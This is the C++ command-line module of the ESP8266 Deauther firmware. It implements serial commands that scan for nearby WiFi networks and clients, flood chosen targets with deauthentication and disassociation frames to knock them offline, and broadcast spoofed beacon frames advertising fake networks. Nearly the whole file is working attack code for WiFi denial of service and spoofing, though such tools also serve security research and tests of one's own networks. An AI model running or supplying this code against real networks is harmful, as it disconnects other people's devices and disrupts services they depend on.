/*
   Copyright (c) 2020 Stefan Kremser
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#include "cli.h"

#include <SimpleCLI.h> // SimpleCLI library

#include "debug.h"     // debug(), debugln(), debugf()
#include "scan.h"
#include "packetinjector.h"
#include "strh.h"
#include "StringList.h"
#include "mac.h"
#include "Targets.h"
#include "vendor.h"

// ram usage
extern "C" {
  #include "user_interface.h"
}

namespace cli {
    // ===== PRIVATE ===== //
    SimpleCLI cli; // !< Instance of SimpleCLI library

    // ===== PUBLIC ===== //
    void begin() {
        debug_init();

        cli.setOnError([](cmd_error* e) {
            CommandError cmdError(e); // Create wrapper object

            debug("ERROR: ");
            debug(cmdError.toString());

            if (cmdError.hasCommand()) {
                debug("\nDid you mean \"");
                debug(cmdError.getCommand().toString());
                debug("\"?");
            }

            debugln();
        });

        Command cmd_help = cli.addCommand("help", [](cmd* c) {
            debugln(cli.toString());
        });
        cmd_help.setDescription("  Print the list of commands that you see right now");

        Command cmd_deauth = cli.addCommand("deauth", [](cmd* c) {
            Command cmd(c);

            TargetList targets;

            { // Read Access Point MACs
                String ap_str = cmd.getArg("ap").getValue();
                StringList list(ap_str, ",");

                while (list.available()) {
                    ap_t* ap = scan::getAP(list.iterate().toInt());
                    if (ap) {
                        targets.push(ap->bssid, mac::BROADCAST, ap->ch);
                    }
                }
            }

            { // Read Station MACs
                String st_str = cmd.getArg("st").getValue();
                StringList list(st_str, ",");

                while (list.available()) {
                    station_t* st = scan::getStation(list.iterate().toInt());
                    if (st && st->ap) {
                        targets.push(st->ap->bssid, st->mac, st->ap->ch);
                    }
                }
            }

            { // Read custom MACs
                String mac_str = cmd.getArg("mac").getValue();

                StringList target_list(mac_str, ",");

                while (target_list.available()) {
                    String target = target_list.iterate();
                    StringList target_data(target, "-");

                    if (target_data.size() != 3) continue;

                    String mac_from_str = target_data.iterate();
                    String mac_to_str   = target_data.iterate();
                    String ch_str       = target_data.iterate();

                    uint8_t mac_from[6];
                    uint8_t mac_to[6];
                    uint8_t ch;

                    mac::fromStr(mac_from_str.c_str(), mac_from);
                    mac::fromStr(mac_to_str.c_str(), mac_to);
                    ch = ch_str.toInt();

                    targets.push(mac_from, mac_to, ch);
                }
            }

            // Check MAC list
            if (targets.size() == 0) {
                debugln("ERROR: No targets selected");
                return;
            }

            // Time
            long seconds                 = cmd.getArg("t").getValue().toInt();
            unsigned long attack_timeout = (seconds > 0) ? seconds*1000 : 0;

            // Number
            unsigned long max_pkts = cmd.getArg("n").getValue().toInt();

            // Rate
            unsigned long pkt_rate = cmd.getArg("r").getValue().toInt();

            // Mode
            String mode = cmd.getArg("m").getValue();

            bool deauth   = false;
            bool disassoc = false;

            if (mode == "deauth+disassoc") {
                debug("Deauthing and disassociating ");
                deauth   = true;
                disassoc = true;
            } else if (mode == "deauth") {
                debug("Deauthing ");
                deauth = true;
            } else if (mode == "disassoc") {
                debug("Disassociating ");
                disassoc = true;
            } else {
                debugln("ERROR: Invalid mode");
                return;
            }

            unsigned long start_time  = millis();
            unsigned long output_time = millis();

            unsigned long pkts_sent       = 0;
            unsigned long pkts_per_second = 0;
            unsigned long pkt_time        = 0;
            unsigned long pkt_interval    = (1000/pkt_rate) * (deauth+disassoc);

            { // Output
                debug(targets.size());
                debugln(" targets:");

                // Print MACs
                targets.begin();

                while (targets.available()) {
                    Target t = targets.iterate();
                    debug("- From ");
                    debug(strh::mac(t.from()));
                    debug(" to ");
                    debug(strh::mac(t.to()));
                    debug(" on channel ");
                    debugln(t.ch());
                }

                debug("With ");
                debug(pkt_rate);
                debugln(" packets per second");

                if (attack_timeout > 0) {
                    debug("Stop after ");
                    debug(seconds);
                    debugln(" seconds");
                }

                if (max_pkts > 0) {
                    debug("Stop after ");
                    debug(max_pkts);
                    debugln(" packets");
                }

                debugln("Type 'stop' or 'exit' to stop the attack");
            }

            bool running = true;

            while (running) {
                targets.begin();

                while (running && targets.available()) {
                    if (millis() - pkt_time >= pkt_interval) {
                        Target t = targets.iterate();

                        if (deauth) pkts_per_second += packetinjector::deauth(t.ch(), t.from(), t.to());
                        if (disassoc) pkts_per_second += packetinjector::disassoc(t.ch(), t.from(), t.to());

                        pkt_time = millis();
                    }
                    if (millis() - output_time >= 1000) {
                        pkts_sent += pkts_per_second;

                        debug(pkts_per_second);
                        debug(" pkts/s, ");
                        debug(pkts_sent);
                        debugln(" sent");

                        output_time = millis();

                        pkts_per_second = 0;
                    }
                    running = !(read_exit()
                                || (attack_timeout > 0 && millis() - start_time > attack_timeout)
                                || (max_pkts > 0 && pkts_sent > max_pkts));
                }
            }
        });
        cmd_deauth.addArg("m/ode", "deauth+disassoc");
        cmd_deauth.addArg("ap", "");
        cmd_deauth.addArg("st/ation", "");
        cmd_deauth.addArg("mac", "");
        cmd_deauth.addArg("t/ime/out", "300");
        cmd_deauth.addArg("n/um/ber", "0");
        cmd_deauth.addArg("r/ate", "20");
        cmd_deauth.setDescription(
            "  Deauthenticate (disconnect) selected WiFi connections\n"
            "  -m:   packet types [deauth,disassoc,deauth+disassoc] (default=deauth+disassoc)\n"
            "  -ap:  access point IDs to attack\n"
            "  -st:  station IDs to attack\n"
            "  -mac: manual target selection [MacFrom-MacTo-Channel] for example:'aa:bb:cc:dd:ee:ff-00:11:22:33:44:55-7'\n"
            "  -t:   attack timeout in seconds (default=300)\n"
            "  -n:   packet limit [>1] (default=0)\n"
            "  -r:   packets per second (default=20)"
            );

        Command cmd_beacon = cli.addCommand("beacon", [](cmd* c) {
            Command cmd(c);

            // SSIDs
            String ssids = cmd.getArg("ssid").getValue();
            StringList list(ssids, ",");

            // MAC from
            String from_str = cmd.getArg("from").getValue();
            uint8_t from[6];

            if (from_str.length() != 17) {
                vendor::randomize(from);
            } else {
                mac::fromStr(from_str.c_str(), from);
            }

            uint8_t last_byte = from[5];

            debug("Sending beacons from ");
            debug(strh::mac(from));

            // MAC to
            String to_str = cmd.getArg("to").getValue();
            uint8_t to[6];

            if (to_str.length() != 17) {
                memcpy(to, mac::BROADCAST, 6);
            } else {
                mac::fromStr(to_str.c_str(), to);
            }

            debug(" to ");
            debugln(strh::mac(to));

            // Encryption
            String enc = cmd.getArg("enc").getValue();
            bool wpa2  = (enc=="wpa2");

            // Channel
            uint8_t ch = cmd.getArg("ch").getValue().toInt();

            // Time
            long seconds                 = cmd.getArg("t").getValue().toInt();
            unsigned long attack_timeout = (seconds > 0) ? seconds*1000 : 0;

            if (attack_timeout > 0) {
                debug("Stop after ");
                debug(seconds);
                debugln(" seconds");
            }

            debugln("Type 'stop' or 'exit' to stop the attack");

            unsigned long start_time  = millis();
            unsigned long output_time = millis();

            unsigned long pkts_sent       = 0;
            unsigned long pkts_per_second = 0;

            unsigned long pkt_time     = millis();
            unsigned long pkt_interval = 100;

            bool running = true;

            while (running) {
                if (millis() - pkt_time >= pkt_interval) {
                    pkt_time = millis();
                    list.begin();

                    for (int i = 0; running && i<list.size(); ++i) {
                        from[5] = last_byte + i;

                        String ssid = list.iterate();

                        pkts_per_second += packetinjector::beacon(ch, from, to, ssid.c_str(), wpa2);
                        delay(1);

                        running = !(read_exit() || (attack_timeout > 0 && millis() - start_time > attack_timeout));
                    }
                }

                if (millis() - output_time >= 1000) {
                    pkts_sent += pkts_per_second;

                    debug(pkts_per_second);
                    debug(" pkts/s, ");
                    debug(pkts_sent);
                    debugln(" sent");

                    output_time = millis();

                    pkts_per_second = 0;
                }
            }
            debugln("Finished");
        });
        cmd_beacon.addArg("s/sid/s");
        cmd_beacon.addArg("from,mac/from", "random");
        cmd_beacon.addArg("to,macto", "FF:FF:FF:FF:FF:FF");
        cmd_beacon.addArg("enc/ryption", "open");
        cmd_beacon.addArg("ch/annel", "1");
        cmd_beacon.addArg("t/ime", "300");
        cmd_beacon.setDescription(
            "  Send WiFi network advertisement beacons\n"
            "  -s:    network names (SSIDs) for example: \"test A\",\"test B\"\n"
            "  -from: sender MAC address (default=random)\n"
            "  -to:   receiver MAC address (default=broadcast)\n"
            "  -enc:  encryption [open,wpa2] (default=open)\n"
            "  -ch:   channel (default=1)\n"
            "  -t:    attack timeout in seconds (default=300)"
            );

        Command cmd_start = cli.addCommand("start", [](cmd* c) {
            String res;
            String cmd;

            debugln("Good morning friend.");

            // Command
            while (!(res == "scan")) {
                debugln("What can I do for you today?\n"
                        "Remember that you can always escape by typing 'exit'\n"
                        "  scan: Search for WiFi networks and clients");
                res = read_and_wait();
                if (res == "exit") {
                    debugln("Ok byeee");
                    return;
                }
            };

            if (res == "scan") {
                // Scan mode
                while (!(res == "ap" || res == "st" || res == "ap+st")) {
                    debugln("Scan mode\n"
                            "  ap: Access Points (WiFi networks)\n"
                            "  st: Stations (WiFi clients)\n"
                            "  ap+st: Access Points and Stations");
                    res = read_and_wait();
                    if (res == "exit") {
                        debugln("Ok byeee");
                        return;
                    }
                };

                cmd += "scan -m " + res;

                // Scan time and channel(s)
                if (res != "ap") {
// Scan time
                    while (!(res.toInt() > 0)) {
                        debugln("Scan time\n"
                                "  >1: Station scan time in seconds");
                        res = read_and_wait();
                        if (res == "exit") {
                            debugln("Ok byeee");
                            return;
                        }
                    };
                    cmd += " -t " + res;

// Scan on channel(s)
                    debugln("Scan on channel(s)\n"
                            "  1-14: WiFi channel(s) to search on (for example: 1,6,11)");

                    res = read_and_wait();
                    if (res == "exit") {
                        debugln("Ok byeee");
                        return;
                    }

                    cmd += " -ch " + res;
                }

                // Retain scan results
                while (!(res == String('y') || res == String('n'))) {
                    debugln("Retain previous scan results\n"
                            "  y: Yes\n"
                            "  n: No");
                    res = read_and_wait();
                    if (res == "exit") {
                        debugln("Ok byeee");
                        return;
                    }
                };

                if (res == String('y')) {
                    cmd += " -r";
                }
            }

            // Result
            for (int i = 0; i<cmd.length()+2; ++i) debug('#');
            debugln();
            debugln("Result:");

            cli::parse(cmd.c_str());
        });
        cmd_start.setDescription("  Start a guided tour through the functions of this device");

        Command cmd_clear = cli.addCommand("clear", [](cmd* c) {
            for (uint8_t i = 0; i<100; ++i) {
                debugln();
            }
        });
        cmd_clear.setDescription("  Clear serial output (by spamming line breaks :P)");

        Command cmd_ram = cli.addCommand("ram", [](cmd* c) {
            debug("Size: ");
            debug(81920);
            debugln(" byte");

            debug("Used: ");
            debug(81920 - system_get_free_heap_size());
            debug(" byte (");
            debug(100 - (system_get_free_heap_size() / (81920 / 100)));
            debugln("%)");

            debug("Free: ");
            debug(system_get_free_heap_size());
            debug(" byte (");
            debug(system_get_free_heap_size() / (81920 / 100));
            debugln("%)");
        });
        cmd_ram.setDescription("  Print memory usage");

        Command cmd_scan = cli.addCommand("scan", [](cmd* c) {
            Command cmd(c);

            // Parse scan time
            int scan_time = cmd.getArg("t").getValue().toInt();
            if (scan_time < 0) scan_time = -scan_time;
            scan_time *= 1000;

            // Parse channels
            String channels      = cmd.getArg("ch").getValue();
            uint16_t channel_reg = 0;

            StringList list(channels, ",");

            while (list.available()) {
                int channel_num = list.iterate().toInt();

                if ((channel_num >= 1) && (channel_num <= 14)) {
                    channel_reg |= 1 << (channel_num-1);
                }
            }

            // Parse retain flag
            bool retain = cmd.getArg("r").isSet();

            // Parse mode
            String mode = cmd.getArg("m").getValue();
            if (mode == "ap") {
                if (!retain) {
                    scan::clearAPresults();
                }
                scan::searchAPs();
            } else if (mode == "st") {
                if (!retain) {
                    scan::clearSTresults();
                }
                scan::searchSTs(scan_time, channel_reg);
            } else if (mode == "ap+st") {
                if (!retain) {
                    scan::clearAPresults();
                    scan::clearSTresults();
                }
                scan::searchAPs();
                scan::searchSTs(scan_time, channel_reg);
            } else {
                debugln("ERROR: Invalid scan mode");
            }
        });
        cmd_scan.addArg("m/ode", "ap+st");
        cmd_scan.addArg("t/ime", "14");
        cmd_scan.addArg("ch/annel", "1,2,3,4,5,6,7,8,9,10,11,12,13,14");
        cmd_scan.addFlagArg("r/etain");
        cmd_scan.setDescription(
            "  Scan for WiFi devices\n"
            "  -m:  scan mode [ap,st,ap+st] (default=ap+st)\n"
            "  -t:  station scan time in seconds [>1] (default=14)\n"
            "  -ch: 2.4 GHz channels for station scan [1-14] (default=all)\n"
            "  -r:  Keep previous scan results"
            );

        Command cmd_results = cli.addCommand("results", [](cmd* c) {
            scan::printResults();
        });
        cmd_results.setDescription("  Print list of scan results [access points (networks) and stations (clients)]");
    }

    void parse(const char* input) {
        debug("# ");
        debug(input);
        debugln();

        cli.parse(input);
    }

    bool available() {
        return debug_available();
    }

    String read() {
        String input = debug_read();

        if (input.charAt(input.length()-1) == '\r') input.remove(input.length()-1);

        debug("# ");
        debugln(input);

        return input;
    }

    String read_and_wait() {
        while (!debug_available()) delay(1);
        return read();
    }

    bool read_exit() {
        if (debug_available()) {
            String input = read();
            return input == "stop" || input == "exit";
        }
        return false;
    }

    void update() {
        if (debug_available()) {
            String input = debug_read();
            cli::parse(input.c_str());
        }
    }
}